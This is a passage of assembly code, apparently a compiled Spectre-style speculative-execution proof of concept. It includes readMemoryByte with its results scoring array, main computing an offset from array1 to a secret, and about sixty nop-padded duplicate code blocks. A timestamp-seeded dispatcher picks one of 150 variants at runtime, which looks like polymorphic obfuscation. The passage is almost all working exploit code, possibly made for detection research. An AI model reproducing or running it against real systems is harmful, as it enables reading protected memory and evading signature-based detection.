	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 91
.LreadMemoryByte_win0_var91:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 92
.LreadMemoryByte_win0_var92:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 93
.LreadMemoryByte_win0_var93:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 94
.LreadMemoryByte_win0_var94:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 95
.LreadMemoryByte_win0_var95:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 96
.LreadMemoryByte_win0_var96:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 97
.LreadMemoryByte_win0_var97:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 98
.LreadMemoryByte_win0_var98:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 99
.LreadMemoryByte_win0_var99:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 100
.LreadMemoryByte_win0_var100:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 101
.LreadMemoryByte_win0_var101:
	popq	%rax
	nop
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 102
.LreadMemoryByte_win0_var102:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 103
.LreadMemoryByte_win0_var103:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 104
.LreadMemoryByte_win0_var104:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 105
.LreadMemoryByte_win0_var105:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 106
.LreadMemoryByte_win0_var106:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 107
.LreadMemoryByte_win0_var107:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 108
.LreadMemoryByte_win0_var108:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 109
.LreadMemoryByte_win0_var109:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 110
.LreadMemoryByte_win0_var110:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 111
.LreadMemoryByte_win0_var111:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 112
.LreadMemoryByte_win0_var112:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 113
.LreadMemoryByte_win0_var113:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 114
.LreadMemoryByte_win0_var114:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 115
.LreadMemoryByte_win0_var115:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 116
.LreadMemoryByte_win0_var116:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 117
.LreadMemoryByte_win0_var117:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 118
.LreadMemoryByte_win0_var118:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 119
.LreadMemoryByte_win0_var119:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 120
.LreadMemoryByte_win0_var120:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 121
.LreadMemoryByte_win0_var121:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 122
.LreadMemoryByte_win0_var122:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 123
.LreadMemoryByte_win0_var123:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 124
.LreadMemoryByte_win0_var124:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 125
.LreadMemoryByte_win0_var125:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 126
.LreadMemoryByte_win0_var126:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 127
.LreadMemoryByte_win0_var127:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 128
.LreadMemoryByte_win0_var128:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 129
.LreadMemoryByte_win0_var129:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 130
.LreadMemoryByte_win0_var130:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 131
.LreadMemoryByte_win0_var131:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 132
.LreadMemoryByte_win0_var132:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 133
.LreadMemoryByte_win0_var133:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 134
.LreadMemoryByte_win0_var134:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 135
.LreadMemoryByte_win0_var135:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 136
.LreadMemoryByte_win0_var136:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 137
.LreadMemoryByte_win0_var137:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 138
.LreadMemoryByte_win0_var138:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 139
.LreadMemoryByte_win0_var139:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 140
.LreadMemoryByte_win0_var140:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 141
.LreadMemoryByte_win0_var141:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
## Variant 142
.LreadMemoryByte_win0_var142:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 143
.LreadMemoryByte_win0_var143:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 144
.LreadMemoryByte_win0_var144:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 145
.LreadMemoryByte_win0_var145:
	popq	%rax
	nop
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 146
.LreadMemoryByte_win0_var146:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	nop
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 147
.LreadMemoryByte_win0_var147:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	nop
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 148
.LreadMemoryByte_win0_var148:
	popq	%rax
	cmpl	%ecx, %eax
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	nop
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	jmp	.LreadMemoryByte_win0_continue
## Variant 149
.LreadMemoryByte_win0_var149:
	popq	%rax
	cmpl	%ecx, %eax
	nop
	jge	LBB1_39
	nop
## %bb.37:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$2, (%rax,%rcx,4)
	nop
	jmp	.LreadMemoryByte_win0_continue
.LreadMemoryByte_win0_continue:
	jne	LBB1_40
## %bb.38:                              ##   in Loop: Header=BB1_5 Depth=1
	movslq	-64(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	cmpl	$0, (%rax,%rcx,4)
	jne	LBB1_40
LBB1_39:
	jmp	LBB1_42
LBB1_40:                                ##   in Loop: Header=BB1_5 Depth=1
	jmp	LBB1_41
LBB1_41:                                ##   in Loop: Header=BB1_5 Depth=1
	movl	-52(%rbp), %eax
	addl	$-1, %eax
	movl	%eax, -52(%rbp)
	jmp	LBB1_5
LBB1_42:
	movl	-60(%rbp), %eax
	movb	%al, %cl
	movq	-40(%rbp), %rax
	movb	%cl, (%rax)
	movslq	-60(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %ecx
	movq	-48(%rbp), %rax
	movl	%ecx, (%rax)
	movl	-64(%rbp), %eax
	movb	%al, %cl
	movq	-40(%rbp), %rax
	movb	%cl, 1(%rax)
	movslq	-64(%rbp), %rcx
	leaq	_readMemoryByte.results(%rip), %rax
	movl	(%rax,%rcx,4), %ecx
	movq	-48(%rbp), %rax
	movl	%ecx, 4(%rax)
	movl	-72(%rbp), %eax
	xorl	_readMemoryByte.results(%rip), %eax
	movl	%eax, _readMemoryByte.results(%rip)
	addq	$144, %rsp
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.globl	_main                           ## -- Begin function main
	.p2align	4, 0x90
_main:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$80, %rsp
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	%rax, -8(%rbp)
	movl	$0, -20(%rbp)
	movl	%edi, -24(%rbp)
	movq	%rsi, -32(%rbp)
	movl	$80, -36(%rbp)
	movq	_secret(%rip), %rax
	leaq	_array1(%rip), %rcx
	subq	%rcx, %rax
	movq	%rax, -48(%rbp)
	movl	$40, -52(%rbp)
	movl	$0, -60(%rbp)
LBB2_1:                                 ## =>This Inner Loop Header: Depth=1
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$150, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win6_var0
	cmpl	$1, %eax
	je	.Lmain_win6_var1
	cmpl	$2, %eax
	je	.Lmain_win6_var2
	cmpl	$3, %eax
	je	.Lmain_win6_var3
	cmpl	$4, %eax
	je	.Lmain_win6_var4
	cmpl	$5, %eax
	je	.Lmain_win6_var5
	cmpl	$6, %eax
	je	.Lmain_win6_var6
	cmpl	$7, %eax
	je	.Lmain_win6_var7
	cmpl	$8, %eax
	je	.Lmain_win6_var8
	cmpl	$9, %eax
	je	.Lmain_win6_var9
	cmpl	$10, %eax
	je	.Lmain_win6_var10
	cmpl	$11, %eax
	je	.Lmain_win6_var11
	cmpl	$12, %eax
	je	.Lmain_win6_var12
	cmpl	$13, %eax
	je	.Lmain_win6_var13
	cmpl	$14, %eax
	je	.Lmain_win6_var14
	cmpl	$15, %eax
	je	.Lmain_win6_var15
	cmpl	$16, %eax
	je	.Lmain_win6_var16
	cmpl	$17, %eax
	je	.Lmain_win6_var17
	cmpl	$18, %eax
	je	.Lmain_win6_var18
	cmpl	$19, %eax
	je	.Lmain_win6_var19
	cmpl	$20, %eax
	je	.Lmain_win6_var20
	cmpl	$21, %eax
	je	.Lmain_win6_var21
	cmpl	$22, %eax
	je	.Lmain_win6_var22
	cmpl	$23, %eax
	je	.Lmain_win6_var23
	cmpl	$24, %eax
	je	.Lmain_win6_var24
	cmpl	$25, %eax
	je	.Lmain_win6_var25
	cmpl	$26, %eax
	je	.Lmain_win6_var26
	cmpl	$27, %eax
	je	.Lmain_win6_var27
	cmpl	$28, %eax
	je	.Lmain_win6_var28
	cmpl	$29, %eax
	je	.Lmain_win6_var29
	cmpl	$30, %eax
	je	.Lmain_win6_var30
	cmpl	$31, %eax
	je	.Lmain_win6_var31
	cmpl	$32, %eax
	je	.Lmain_win6_var32
	cmpl	$33, %eax
	je	.Lmain_win6_var33
	cmpl	$34, %eax
	je	.Lmain_win6_var34
	cmpl	$35, %eax
	je	.Lmain_win6_var35
	cmpl	$36, %eax
	je	.Lmain_win6_var36
	cmpl	$37, %eax
	je	.Lmain_win6_var37
	cmpl	$38, %eax
	je	.Lmain_win6_var38
	cmpl	$39, %eax
	je	.Lmain_win6_var39
	cmpl	$40, %eax
	je	.Lmain_win6_var40
	cmpl	$41, %eax
	je	.Lmain_win6_var41
	cmpl	$42, %eax
	je	.Lmain_win6_var42
	cmpl	$43, %eax
	je	.Lmain_win6_var43
	cmpl	$44, %eax
	je	.Lmain_win6_var44
	cmpl	$45, %eax
	je	.Lmain_win6_var45
	cmpl	$46, %eax
	je	.Lmain_win6_var46
	cmpl	$47, %eax
	je	.Lmain_win6_var47
	cmpl	$48, %eax
	je	.Lmain_win6_var48
	cmpl	$49, %eax
	je	.Lmain_win6_var49
	cmpl	$50, %eax
	je	.Lmain_win6_var50
	cmpl	$51, %eax
	je	.Lmain_win6_var51
	cmpl	$52, %eax
	je	.Lmain_win6_var52
	cmpl	$53, %eax
	je	.Lmain_win6_var53
	cmpl	$54, %eax
	je	.Lmain_win6_var54
	cmpl	$55, %eax
	je	.Lmain_win6_var55
	cmpl	$56, %eax
	je	.Lmain_win6_var56
	cmpl	$57, %eax
	je	.Lmain_win6_var57
	cmpl	$58, %eax
	je	.Lmain_win6_var58
	cmpl	$59, %eax
	je	.Lmain_win6_var59
	cmpl	$60, %eax
	je	.Lmain_win6_var60
	cmpl	$61, %eax
	je	.Lmain_win6_var61
	cmpl	$62, %eax
	je	.Lmain_win6_var62
	cmpl	$63, %eax
	je	.Lmain_win6_var63
	cmpl	$64, %eax
	je	.Lmain_win6_var64
	cmpl	$65, %eax
	je	.Lmain_win6_var65
	cmpl	$66, %eax
	je	.Lmain_win6_var66
	cmpl	$67, %eax
	je	.Lmain_win6_var67
	cmpl	$68, %eax
	je	.Lmain_win6_var68
	cmpl	$69, %eax
	je	.Lmain_win6_var69
	cmpl	$70, %eax
	je	.Lmain_win6_var70
	cmpl	$71, %eax
	je	.Lmain_win6_var71
	cmpl	$72, %eax
	je	.Lmain_win6_var72
	cmpl	$73, %eax
	je	.Lmain_win6_var73
	cmpl	$74, %eax
	je	.Lmain_win6_var74
	cmpl	$75, %eax
	je	.Lmain_win6_var75
	cmpl	$76, %eax
	je	.Lmain_win6_var76
	cmpl	$77, %eax
	je	.Lmain_win6_var77
	cmpl	$78, %eax
	je	.Lmain_win6_var78
	cmpl	$79, %eax
	je	.Lmain_win6_var79
	cmpl	$80, %eax
	je	.Lmain_win6_var80
	cmpl	$81, %eax
	je	.Lmain_win6_var81
	cmpl	$82, %eax
	je	.Lmain_win6_var82
	cmpl	$83, %eax
	je	.Lmain_win6_var83
	cmpl	$84, %eax
	je	.Lmain_win6_var84
	cmpl	$85, %eax
	je	.Lmain_win6_var85
	cmpl	$86, %eax
	je	.Lmain_win6_var86
	cmpl	$87, %eax
	je	.Lmain_win6_var87
	cmpl	$88, %eax
	je	.Lmain_win6_var88
	cmpl	$89, %eax
	je	.Lmain_win6_var89
	cmpl	$90, %eax
	je	.Lmain_win6_var90
	cmpl	$91, %eax
	je	.Lmain_win6_var91
	cmpl	$92, %eax
	je	.Lmain_win6_var92
	cmpl	$93, %eax
	je	.Lmain_win6_var93
	cmpl	$94, %eax
	je	.Lmain_win6_var94
	cmpl	$95, %eax
	je	.Lmain_win6_var95
	cmpl	$96, %eax
	je	.Lmain_win6_var96
	cmpl	$97, %eax
	je	.Lmain_win6_var97
	cmpl	$98, %eax
